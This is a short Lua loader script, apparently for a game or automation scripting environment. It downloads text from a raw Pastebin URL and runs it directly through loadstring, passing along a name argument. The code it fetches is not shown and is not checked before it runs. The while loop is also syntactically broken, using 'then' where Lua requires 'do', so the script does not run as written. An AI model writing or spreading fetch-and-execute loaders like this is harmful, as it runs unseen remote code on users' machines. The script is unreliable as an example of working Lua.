local name = ...;

Program.Wait(1);

local raw = "https://pastebin.com/raw/R0CZPdQP";
local req = https.request(raw);

while not req:isDone() then
    Program.Wait(0.01);
end

loadstring(req:get())(name);